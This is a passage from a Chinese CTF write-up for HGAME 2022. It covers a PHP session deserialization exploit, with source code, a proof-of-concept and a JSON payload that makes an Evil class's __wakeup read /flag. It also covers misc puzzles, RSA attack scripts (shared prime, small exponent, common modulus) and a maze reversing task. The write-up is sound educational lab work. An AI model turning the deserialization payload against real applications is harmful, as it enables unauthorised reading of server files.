function loadSessionData(): Array {
    $filename = '/tmp/'.$_SESSION['unique_key'].'.session';
    if (file_exists($filename)) {
        $str = file_get_contents($filename);
        return decode($str);
    } else {
        file_put_contents($filename, '');
        return [];
    }
}

echo json_encode(loadSessionData());
```

**Evil.php**

```php
<?php

class Evil {
    public $file;
    public $flag;

    public function __wakeup() {
        $content = file_get_contents($this->file);
        if (preg_match("/hgame/", $content)) {
            $this->flag = 'hacker!';
        }
        $this->flag = $content;
    }
}
```

接下来就是看一下漏洞在哪，首先get.php里面告诉我们，flag is in /flag，意思就是flag在/flag这个文件里面，然后通过搜索引擎也是了解到了反序列化漏洞，那么在这里，由于**在原生session文件处理的实现中，开发者使用`|`对属性进行分割，但键名没有过滤，可以插入`|`。如果用户可控键名，那么就会导致反序列化逃逸。**

这是反序列化漏洞产生的原因（这点我是在放出hint后看了 [SCTF 2021 ezosu](https://github.com/SycloverTeam/SCTF2021/tree/master/web/ezosu)这题的官方题解后才想明白），那么现在我们的目标就是反序列化一个Evil类，并且让反序列化还原出来的Evil类中，`$file = /flag`啦，至于说Evil里面对flag内容进行了过滤什么的，我们先不考虑，我们先成功访问到/flag文件再说嘛，那么我们这时候就可以开始构造POC啦，构造POC的过程我也参考了ezosu的poc构造，然后我们这题的poc的话是不需要找pop链的，pop链就是你返序列化的类中没有可以直接利用的内容，而是需要通过a调用b，b调用c等等一连串的方式才能够拿到你想获得的信息，那么我们这题因为Evil类中的__wakeup函数（\_\_wakeup函数是魔法函数，此函数会在反序列化Evil对象时被调用）会直接修改flag变量的值，可以直接利用，只要file=/flag，那么的话content的内容就是/flag文件的内容啦。

SCTF 2021 ezosu的poc

![image-20220201002002852](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220201002002852.png)

本题的POC

```php
<?php

class Evil
{
    public $file = "/flag";

}

$object = new Evil();

echo json_encode(["aaa|" . serialize($object) . "aa" => "aaaa"]);

```

我们传入的JSON数据，POST请求Save.php接口传入此数据，GET请求get.php接口，我们就能够拿到flag啦

```json

{"aaa|O:4:\"Evil\":1:{s:4:\"file\";s:5:\"\/flag\";}aa":"aaaa"}
```

![image-20220201001714814](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220201001714814.png)

当然这里还有令人疑惑的一点是，诶那难道Evil.php中对于/flag内文件中内容的过滤，`preg_match`函数过滤了hgame内容，为什么没有起作用呀，询问出题人后发现，出题人说其实一开始忘记return了，后来发现做出的人比较少决定就，不添加难度了（

![image-20220201144643550](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220201144643550.png)

## MISC

### 小游戏

硬玩小技巧 在上面标注出entry 然后玩到stage5 level5后就会出flag

![image-20220203133516401](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220203133516401.png)

```
hgame{WhaT~@_InTEResT|ng~GAmE}
```

### 一张怪怪的名片

题目考察的是QR code信息的读取,PBKDF2、AES、Base64的加密，还有需要你有不小的脑洞（

首先我们打开题目给出的图片，发现有四块二维码，除此之外也没有什么有用的信息，我们先尝试把二维码拼起来看看能不能扫出来点什么

![image-20220129121159107](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129121159107.png)

这里我是用了一个在线PS的网站，调整图片的阈值就可以将图片二值化，变成只有黑白

![image-20220129121351732](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129121351732.png)

那么接下来的话我在PPT里面把四个二维码碎片分别截图然后拼接起来，使用PPT是因为ppt会有自动对齐，这样拼接二维码的效果会比较好

![image-20220129121450834](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129121450834.png)

然后我们尝试扫码发现扫不出来，在了解了QR code的原理后我们得知中间一大片黑扫不出来是非常正常的，二维码应该是有一定的破损，那么这里我们就使用QRazyBox读取一下二维码残缺的信息，发现二维码解码后的字符串是一个网站，前面的homdgink应该就是鸿贵安，然后后面的homeboyc是一级域名

![image-20220129120744542](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129120744542.png)

这个时候我们就想到题目的hint，鸿师傅不喜欢百度，所以我们去百度搜索一下，出题人应该是做了百度的SEO，那么我们可以发现这个一级域名是个博客，点进去看看

![image-20220129120921368](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129120921368.png)

博客的文章没发现什么，我们去看看友链版

![image-20220129120627531](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129120627531.png)

友链版中我们发现鸿贵安的自留地，给出的图片里面也有鸿贵安三个字，我们点进去看看

![image-20220129120646591](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129120646591.png)

看起来我们发现了藏有flag的地方，信息量也不少，我们依次点击进去并且翻译一下看看说了点啥信息.

![image-20220129120543534](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129120543534.png)

盗号 -> 使用了弱密码，弱密码中塞有蒙尔的信息（意思是应该不止有蒙尔的信息）

![image-20220129122224145](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129122224145.png)

flag -> 鸿贵安和蒙尔约定了密码，密码先转换成了key 然后flag用AES的ECB模式 通过key加密了 接下来给出了AES-128加密后的密文

![image-20220129122243751](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129122243751.png)

生日快乐 -> 2021.8.16 祝愿蒙尔生日快乐 说明蒙尔生日2002.8.16 

![image-20220129122304464](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129122304464.png)

About -> 生日信息的泄露存在风险

![image-20220129122326239](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129122326239.png)



汇总一下看看如何入手

盗号 -> 使用了弱密码，弱密码中塞有蒙尔的信息（意思是应该不止有蒙尔的信息）

flag -> 鸿贵安和蒙尔约定了密码，密码先转换成了key 然后flag用AES的ECB模式 通过key加密了 接下来给出了AES-128加密后的密文

生日快乐 -> 2021.8.16 祝愿蒙尔生日快乐 说明蒙尔生日2002.8.16 

About -> 生日信息的泄露存在风险

首先的话我们需要猜密码，密码有蒙尔的信息，不止有蒙尔的信息，有蒙尔的生日，是弱密码，这里是需要脑洞的，联想到鸿贵安和蒙尔两个人名字如此奇怪发现首字母缩写竟然是hga me，那么我们猜到弱密码就是hgame20020816

将弱密码用Derive PBKDF2 key 密钥加密算法加密出key，注意Salt的值已经给出，就是1

![image-20220129120517005](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129120517005.png)

然后我们拿到的flag是个base64编码的，我们先base64解码一层，再AES 解码 选择ECB模块，这里需要注意input是Raw，base64解码后并不是明文的形式，然后发现解出来的东西仍然有一层base64，但是我们会能够发现这里可以完全解码，这是可以作证我们前几部并没有猜错的

![image-20220129122837902](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129122837902.png)

再看看题目，题目还说别忘了base64，我们这里再base64解密一层就拿到flag啦，然后至于这里为什么需要前后都套一层base64，应该是AES的输入输出都是Bytes，不是明文的形式，所以需要base64两边都套一层变成明文

![image-20220129120503270](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220129120503270.png)

### 你上当了 我的很大

首先我们把压缩包全部解压出来，我们可以得到3个视频，这三个视频大小都比较接近，仔细观察发现，有两个视频的后5秒都有一种图形码

![image-20220130224824684](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130224824684.png)

我们找一个在线扫码网站试试。发现这是DATAMATRIX编码的，将扫码得到的结果base64转png，我们可以得到QR code的1/4，这个时候我们就能猜测是不是少了点什么，因为两个视频后面有俩图片，一个对应一个1/4，后来经过和出题人对线也是发现附件确实有问题，题目更新描述后又上传了两个图形码，我们同样试图找到他们是什么编码并且通过在线解码将得到的base64结果转成png，可以分别得到二维码的各1/4部分，这里分别用来DATAMATRIX，PDF417，AZTEC，Codablock这么四种图形码

![image-20220130212812830](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130212812830.png)

![image-20220130224716271](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130224716271.png)

![image-20220130224740991](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130224740991.png)

![image-20220130224754332](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130224754332.png)

Base64转二维码

![image-20220130212824760](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130212824760.png)

我们将得到的四个二维码碎片拼起来即可，最后还是拼了有一会哈哈哈中间还有个小方块是空的

![image-20220130225007151](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130225007151.png)

![image-20220130225045578](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220130225045578.png)

## CRYPTO

### RSA Attack

考RSA加密的题目，题目给出了n，e，c，那么也就是给出了公钥（e，n）和密文c，有了n我们可以分解出p和q，然后利用p，q，e我们可以解出模反元素d，然后解密需要d和n也就是私钥，这时候我们都有了，C的d次幂modn就能得到明文M

```python
import gmpy2
from libnum import n2s

def make_key(p, q, e):
    n = p * q
    phi = (p - 1) * (q - 1)
    d = gmpy2.invert(e, phi)
    return d


e, p, q, c = 65537, 978782023871716954857211, 715800347513314032483037, 122622425510870177715177368049049966519567512708
d = make_key(p, q, e)
n = p * q
plaintext = (gmpy2.powmod(c, d, n))
flag = n2s(int(plaintext))
print(flag)

```

```
hgame{SHorTesT!fLAg}
```

### Chinese Character Encryption

题目考察的是一种以拼音和声调为基础的编码方式，在给出hint后也是终于明白咋做了了，题目的加密方式就是将拼音每一位字符在拼音表中对应的位置相加再加上音调，例如第一声就加1以此类推，再根据位数加上一个偏移量，将数字转ascii码就可以得到flag啦

其中偏移量的话是有一个规律，如果都有声调的拼音，例如xing2 2表示第二声，x在拼音表对应第24个字符，就是24，xing对应的字符分别相加后，再加上音调对应的值2，再加上偏移量48，得到104，chr(104)得到h，然后如果是3个字母组成的字符串并且有音调偏移量就是80，字母越少需要加上的偏移量是越多的，每少一个就要多加32，这个的话也比较好理解因为如果字母越少，那么相加得到的值就越少，如果说希望表示拼音的尽可能多，就要多加一些，需要注意的是有无音调加上的偏移量还不一样，但是其实不影响做题的，就直接不管没有声调的，然后把解出来的flag拼一拼也足够得到正确flag了，我一开始还以为没有声调就相当于是+0，偏移量不变，但是其实不是的，所以说我之前也是在很多位置都得到了两种结果，但是我前面的hgame{是能够匹配的，然后仔细查看后修改了一下也是能够每一行都能得到flag了，有一行不知道为啥会变成非明文字符，但是我感觉没啥问题的（

![image-20220201221650679](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220201221650679.png)

一份非常不优雅的代码↓  不过pilot的自动补全是真的很舒服，所以说写了前面几个if后，后面都是Tab按两下就补全了，但是这个结构是真的非常非常非常丑陋的....重构一下代码的话应该是，先判断末尾是不是有数字，也就是有没有声调，然后再根据长度直接得到字符，而不是写这么多嵌套的if 和 elif 非常丑陋（，就是我是边思考题目边写了因为我一开始没发现声调有无的规律也没有发现偏移量这个递增递减的规律，前面我们通过已知hgame是只能解出来3个字母有声调和4个字母有声调的，先尝试了一下只用3个字母和4个字母的情形能不能解出来，发现不能之后又是修修补补代码，所以说也是说代码越糊越丑陋了

```python
from pypinyin import pinyin, lazy_pinyin, Style

style = Style.TONE3
Table = "abcdefghijklmnopqrstuvwxyz"
MathTable = "01234"


def decFlag(flagArr):
    flag = ""
    for i in range(len(flagArr)):
        if len(flagArr[i]) == 2:
            if flagArr[i][1].isalpha():
                flag += chr(Table.find(flagArr[i][0]) + 1 + Table.find(flagArr[i][1]) + 1 + 112)
        elif len(flagArr[i]) == 3:
            if flagArr[i][2].isdigit():
                flag += chr(
                    Table.find(flagArr[i][0]) + 1 + Table.find(flagArr[i][1]) + 1 + MathTable.find(flagArr[i][2]) + 112)
            elif flagArr[i][2].isalpha():
                flag += chr(
                    Table.find(flagArr[i][0]) + 1 + Table.find(flagArr[i][1]) + 1 + Table.find(flagArr[i][2]) + 1 + 32)
        elif len(flagArr[i]) == 4:
            if flagArr[i][3].isdigit():
                flag += chr(Table.find(flagArr[i][0]) + 1 + Table.find(flagArr[i][1]) + 1 + Table.find(
                    flagArr[i][2]) + 1 + MathTable.find(flagArr[i][3]) + 80)
            elif flagArr[i][3].isalpha():
                flag += chr(Table.find(flagArr[i][0]) + 1 + Table.find(flagArr[i][1]) + 1 + Table.find(
                    flagArr[i][2]) + 1 + Table.find(flagArr[i][3]) + 1)
        elif len(flagArr[i]) == 5:
            if flagArr[i][4].isdigit():
                flag += chr(Table.find(flagArr[i][0]) + 1 + Table.find(flagArr[i][1]) + 1 + Table.find(
                    flagArr[i][2]) + 1 + Table.find(flagArr[i][3]) + 1 + MathTable.find(flagArr[i][4]) + 48)
            elif flagArr[i][4].isalpha():
                flag += chr(Table.find(flagArr[i][0]) + 1 + Table.find(flagArr[i][1]) + 1 + Table.find(
                    flagArr[i][2]) + 1 + Table.find(flagArr[i][3]) + 1 + Table.find(flagArr[i][4]) + 1 - 32)
        elif len(flagArr[i]) == 6:
            if flagArr[i][5].isdigit():
                flag += chr(Table.find(flagArr[i][0]) + 1 + Table.find(flagArr[i][1]) + 1 + Table.find(
                    flagArr[i][2]) + 1 + Table.find(flagArr[i][3]) + 1 + Table.find(flagArr[i][4]) + 1 + MathTable.find(
                    flagArr[i][5]) + 16)
            elif flagArr[i][5].isalpha():
                flag += chr(Table.find(flagArr[i][0]) + 1 + Table.find(flagArr[i][1]) + 1 + Table.find(
                    flagArr[i][2]) + 1 + Table.find(flagArr[i][3]) + 1 + Table.find(flagArr[i][4]) + 1 + Table.find(
                    flagArr[i][5]) + 1 - 64)
        elif len(flagArr[i]) == 7:
            if flagArr[i][6].isdigit():
                flag += chr(Table.find(flagArr[i][0]) + 1 + Table.find(flagArr[i][1]) + 1 + Table.find(
                    flagArr[i][2]) + 1 + Table.find(flagArr[i][3]) + 1 + Table.find(flagArr[i][4]) + 1 + Table.find(
                    flagArr[i][5]) + 1 + MathTable.find(flagArr[i][6]) - 16)
        else:
            print("errorrrrrrr!!!:", flagArr[i])
    print(flag)


encflag = ['陉萏俦蘭貑謠祥冄剏髯簧凰蕆秉僦笆鼣雔耿睺渺仦殣櫤鄽偟壮褃劳充迧蝔镁樷萾懴雈踺猳钔緲螩蝒醢徣纒漐',
           '瑢蚇魫灡麚踲儣硖剏竊蝗鍠綳瑊臼渣璎賍併沚坕昉進糧玤黄羌顺瓜茺笻飯爦撵階檦嚀箭瓮佩覫螩幒魛蘲壥赞',
           '屝疳蹮髕魛溫嫜贪怆贴垯艎睁瑊搇皶费铦蛟词撚鶭哉粱缠鐄鏘瞬颲浺訦笴蠻鯍嵅汴繕籢虥厨尦螩漖猆尻蝉嬼',
           '梥粓賍襴餥磘鞤珃剙肰脌癀烝鈵溔騢榕皗鲠妣婃瓬脃絳蝉垯锖琻酹榋蔯晗鳗糆梒纲巩翴藵櫥冡螩鐐腵褦缠毐',
           '孾騡鍚幱鳵飖囆騢刱篋凰広惼柄冊癱琜讅绠彽鍴猠擾醬涱锽崈糉铹茺貥稭檈徖烗玣彋諓佳捫鸫螩専猳纝爂丨',
           '鑍诞忺萲輚遙蠆擹瀮箧簧徨潮餅雯巹橰栦嬌躁詗昉噘梁涱穔玱幮悬珫殿邗鵷昸勧堈纮廉脡矝懐螩緜摛水飙趀',
           '韺坩鸉媗烶藈傽菫刱垖餭簧谠姦芠冄褣酬鲛麏埬豋嫩樑谗瑝獇諙噻憃睘牶峠矒街辫赡蒗誜狍溕螩瑼攡輫鄽穩',
           '烾搼諹玫摛伅粻皰剙槊丄獚謿戋嘊礟废伡鐎瞹腫仦壣椋纏凰輲闹髝川辰蓪歄塚煯牨畋硁矰画鯟螩忠鴇錻棎贊',
           '罂钾忺粩侙磘橳黜剏叛緔艎罺豜蒥厙来甠鳯篌詗忄瓫櫤飊楻壮鏙寃嘃霃蜬擁篎萾圵碵莾齝鬊稉螩嘂塰皜怊讚',
           '来煋先郿緥渰幫琡剙獸広蟥巅麉廏缀馠屳蓈睺賨覴涛弜账煌状話煭沖迸萤悬檬崡剛槎踐瓣澅塚螩衳瓂顥猋哥',
           '虇猩菜鱝寶错鞤巹瀮髯鷬脌嘣柄舅烚翉棾骾嫒巑俵睵辌扙遑焋磪頪憃麎塋瓜稉飰鼦歚饤浃巾賩螩鐐裶曍飇戈',
           '犬悱黥諠媸笉璋欇瀮壽鍠犷骣炳嘊癱婴菤锒問麺舫鱗袶帳喤猐蕏痨珫塵眹瞒氋碝錶狯蝊葢舿碾螩颛侹徣欩瓒',
           '蒈襙砗瀾漑淛橳蔎怆貼垯喤谠殱姲懾嵘蛼勆裹泾驓婒糧蜯锽状鬊噻摏窮傇雍秒筨韂鳤籨犌舜礞螩胮輚痛婵濽',
           '壖騂羘礨甕汣獐侭剙鑻墶媓筝鰹暥厍雴躚鹪鄙晶昉褷酱涱犷壵慛跒忡電皆癕泾軟剛慏詾扉爮囨螩刣曹庎磛鿔',
           '熔卶鰑譋瞝嚲蠆疤剙三墶煌徰柄钩饶孆暹焨謴秒蒧晋櫤纏諻牄鶵涙茺煢瀯浖麫鋡蟀掽鑬齝津簐螩轎譄镭鏢刎',
           '畎巏臇鹛緥謡蕂黜剏犙獚繨徰艱驑谨曧覾稂鹨媏嚸繖辌讒癀锖婳磱瑏塣膼哰篎炵堽碰鲢鵄幮京螩蟟槪戒颷虐']
for i in encflag:
    decFlag(lazy_pinyin(i, style=style))

```

```
hgame{It*sEEMS|thaT~YOu=LEArn@PinYiN^VerY-WelL}
```

### RSA Attack 2

第一部分（模不互素）给出e，n1，c1，n2，c2，然后两个加密用了一个共同的质数q，利用欧几里得算法可以解出n1和n2的分解出来的质数，然后再求解出d然后得到密钥再解密明文就可以

第二部分（小明文攻击）给出n，e，c，当e很小，m也不大时，于是`m^e=k*n+m` 中的的k值很小甚至为0，。从 0 开始穷举k，对每一次 k*n + c 开e次方，直到得到整数结果，整数结果即为明文。

第三部分（共模攻击）给出n，e1，c1，e2，c2，c1 = pow(m, e1, n)，c2 = pow(m, e2, n)，加密c1和c2使用了相同的模数n，需要使用共模攻击解出flagPart2，当e1，e2互质，则有gcd(e1,e2)=1

根据扩展欧几里德算法，对于不完全为 0 的整数 a，b，gcd（a，b）表示 a，b 的最大公约数。那么一定存在整数 x，y 使得 gcd（a，b）=ax+by所以得到：e1*s1+e2*s2 = 1，因为e1和e2为正整数，所以s1、s2皆为整数，但是一正一负，此时假设s1为正数,s2为负数

我们证明出m=(c1^s1*c2^s2)%n即可

```python
import gmpy2
from libnum import *
def make_key(p, q, e):
    n = p * q
    phi = (p-1) * (q-1)
    d = gmpy2.invert(e, phi)
    return d
n1 = 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553
n2 = 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363
a = 123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411
c1 = 965075803554932988664271816439183802328812013694203741320763105376036912584995031647672348468111310423680858101990670067065306237596121664884353679987689532305437801346923070145524106271337770666947677115752724993307387122132705797012726237073550669419110046308257408484535063515678066777681017211510981429273346928022971149411064556225001287399141306136081722471075032423079692908380267160214143720516748000734987068685104675254411687005690312116824966036851568223828884335112144637268090397158532937141122654075952730052331573980701136378212002956719295192733955673315234274064519957670199895100508623561838510479
c2 = 11536506945313747180442473461658912307154460869003392732178457643224057969838224601059836860883718459986003106970375778443725748607085620938787714081321315817144414115589952237492448483438910378865359239575169326116668030463275817609827626048962304593324479546453471881099976644410889657248346038986836461779780183411686260756776711720577053319504691373550107525296560936467435283812493396486678178020292433365898032597027338876045182743492831814175673834198345337514065596396477709839868387265840430322983945906464646824470437783271607499089791869398590557314713094674208261761299894705772513440948139429011425948090

q1 = n1//a
q2 = n2//a

e = 65537
d1 = make_key(a, q1, e)
d2 = make_key(a, q2, e)
plaintext1 = (gmpy2.powmod(c1, d1, n1))
plaintext2 = (gmpy2.powmod(c2, d2, n2))
print(plaintext2)
print(plaintext1)
print(n2s(int(plaintext1)))
```
```python
import gmpy2
import libnum
from libnum import *

def de(c, e, n):
    k = 0
    while True:
        mm = c + n*k
        result, flag = gmpy2.iroot(mm, e)
        if True == flag:
            return result
        k += 1
n= 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537
e= 7
c= 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625
m=de(c,e,n)
print(m)
print(n2s(int(m)))

```

```python
from libnum import *
import gmpy2

def gongmogongji(n, c1, c2, e1, e2):
    def egcd(a, b):
        if b == 0:
            return a, 0
        else:
            x, y = egcd(b, a % b)
            return y, x - (a // b) * y
    s = egcd(e1, e2)
    s1 = s[0]
    s2 = s[1]

    # 求模反元素
    if s1 < 0:
        s1 = - s1
        c1 = gmpy2.invert(c1, n)
    elif s2 < 0:
        s2 = - s2
        c2 = gmpy2.invert(c2, n)
    m = pow(c1, s1, n) * pow(c2, s2, n) % n
    return m
print(gongmogongji(18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729,3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870,940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861,2519901323,3676335737))
print(n2s(187134557176277803609960019345398707113865293121166341187786621))
```



```
hgame{RsA@hAS!a&VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW}
```



## RE

### xD MAZE

re这周的送分题（ 最后几个小时静下心看了看就做出来了

首先拖进ida看看，发现可以反编译的，看一看反编译后的伪代码

![image-20220203195853165](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220203195853165.png)

然后这里最关键的就是看一看这个**byte_404020**，发现是个迷宫的数据

![image-20220203195928744](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220203195928744.png)

然后v14是输入0123的话，会分别走512，64，8，1个字符，所以说我们只需要解出走迷宫的步骤就可以得到flag啦

```python
num = [2, 63, 1, 7, 1, 511, 1, 63, 1, 63, 2, 511, 2, 63, 1, 7, 1, 511, 2, 7, 1, 511, 2, 7, 1, 7, 1, 7, 1, 7, 2, 63, 1,
       511, 1, 511, 2, 511, 1, 63, 1, 63, 1]
count = 0
print('hgame{', end='')
for i in range(len(num)):
    if (i % 2 == 0):
        if (num[i] == 2):
            print('3', end='')
    else:
        if (num[i] == 511):
            print('0', end='')
        elif (num[i] == 63):
            print('1', end='')
        elif (num[i] == 7):
            print('2', end='')
        elif (num[i] == 1):
            print('3', end='')
print('}')

```

![image-20220203200008026](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220203200008026.png)
